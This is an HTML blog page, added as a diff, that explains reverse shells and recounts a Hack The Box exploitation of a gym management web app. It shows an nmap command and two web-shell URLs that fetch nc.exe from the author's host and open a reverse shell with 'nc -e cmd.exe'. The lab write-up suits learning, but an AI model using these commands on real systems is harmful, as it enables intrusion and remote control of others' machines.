@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RCE | Ishan Jirety</title>
+    <link rel="stylesheet" href="/Styles.css">
+</head>
+
+<body>
+    <!-- Inserting Nav Bar -->
+
+    <!-- End Of Nav Bar -->
+
+    <header class="hero">
+        <img src="Images/Hero.svg" alt="" class="hero-img">
+        <h1 class="hero-heading"><span class="heading-inverted">Remote Code Execution</span> </h1>
+    </header>
+    <!-- End Of Hero -->
+
+    <!-- Section Begings -->
+    <section class="section">
+        <div class="container container-center">
+            <h1>What Is RCE ?</h1>
+            <p>To take over a compromised system, an attacker usually aims to gain interactive shell access for command execution. With such access, they can try to elevate their privileges to obtain full control of the operating system. However, most systems are behind firewalls and direct remote shell connections are impossible. One of the methods used to circumvent this limitation is a reverse shell.</p>
+            <br>
+            <h1>How a Reverse Shell Works ?</h1>
+            <p>
+                In a normal remote system access scenario, the attacker is the client and the target machine is the server. The attacker initiates a remote shell connection and the target system listens for such connections. With a reverse shell, the roles are opposite. It is the target machine that initiates the connection to the attacker, and the attacker's computer listens for incoming connections on a specified port.
+The primary reason why reverse shells are often used by attackers is the way that most firewalls are configured. Attacked servers usually allow connections only on specific ports. For example, a dedicated web server will only accept connections on ports 80 and 443. This means that there is no possibility to establish a shell listener on the attacked server.
+On the other hand, firewalls usually do not limit outgoing connections at all. Therefore, an attacker may establish a server on their machine and create a reverse connection. All that the attacker needs are a machine that has a public (routable) IP address or forwarded IP and a tool such as Netcat to create the listener and bind shell access to it.
+            </p>
+            <h1>Exploiting HTB Machine..</h1>
+            <p>Scanning Phase :
+                A normal nmap scan <strong>Nmap -sS -T4 -A -p- 10.10.10.198</strong></p>
+                <ul class="list list-non-bullet">
+                    <li class="list-items-inline">-S for stealth scan</li>
+                    <li class="list-items-inline">-T4 Time</li>
+                    <li class="list-items-inline">-A all Scripts</li>
+                    <li class="list-items-inline">-p- Scanning All ports</li>
+                </ul>
+            </p>
+            
+        </div>
+        <header class="hero">
+            <img src="blogimages/NmapScan.png" alt="" class="hero-img">
+        </header>
+        <p> Nmap Scan didn't give any good results but it showed 8080 is open for web server and that was where the main enumeration comes into the picture. After opening port 8080 with IP it showed a proper gym management system and after getting more deep into it, in about panel, there was clearly mentioned "Made Using Gym Management Software" after googling vulnerabilities of gym management system</p>
+        <header class="hero">
+            <img src="blogimages/GoogleSearch.png" style="max-width: 500px;" alt="" class="hero-img">
+        </header>
+        <p>I downloaded and executed this software but it didn't worked for me. But after reading source code and finding out what urls this script is trying to fetch, to access it manually I found it is allowing to check its uploads and a bit of directory traversial "upload/kamehameha.php" after this I created 
+        a python simpleHTTPsever on my machine to upload netcat to get reverse shell using <strong>http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl%20-O%2010.10.14.145/nc.exe</strong></p>
+        <header class="hero">
+            <img src="blogimages/CreatingServer.png" style="max-width: 700px;" alt="" class="hero-img">
+        </header>
+            <p>After uploading nc on machine it was easy to connect and extablish a shell as link was allowing to execute commands <strong>10.10.10.198:8080/upload/kamehameha.php?telepathy=nc -e cmd.exe 10.10.14.145 4444</strong></p>
+            <header class="hero">
+                <img src="blogimages/reverseshell.png" style="max-width: 700px;" alt="" class="hero-img">
+            </header>
+            <p>After so much of Scanning Enumeration it gave back this RCE it was my first RCE on a server.</p>       
+    </section>
+
+    <!-- Section Ends -->
+
+    <footer class="footer">
+        <div class="footer-headers" style="font-size:1.5rem;"></div>
+        <ul class="social-links list-non-bullet">
+            <!-- <h1 style="font-size:0.9rem;">Connect With Me On</h1> -->
+            <br>
+            <li class="list-items-inline"><a href="https://github.com/ishanjirety" class="link"><img
+                        src="https://img.icons8.com/fluent/100/000000/github.png" style="max-width: 30px;" /></a></li>
+
+            <li class="list-items-inline"><a href="https://www.linkedin.com/in/ishan-jirety-a1b4a31aa/"
+                    class="link"><img src="https://img.icons8.com/fluent/48/000000/linkedin.png"
+                        style="max-width: 30px;" /></a></li>
+
+            <li class="list-items-inline">
+                <a href="https://twitter.com/IshanJirety" class="link">
+                    <img src="https://img.icons8.com/fluent/48/000000/twitter.png" style="max-width:30px;"/>
+                </a>
+            </li>
+            <br>
+           </ul>
+           <ul class="list-non-bullet">
+            <li class="list-items-inline">Github</li>
+            <li class="list-items-inline">Linkedin</li>
+            <li class="list-items-inline">Twitter</li>
+           </ul>
+    </footer>
+
+</body>
+
+</html>
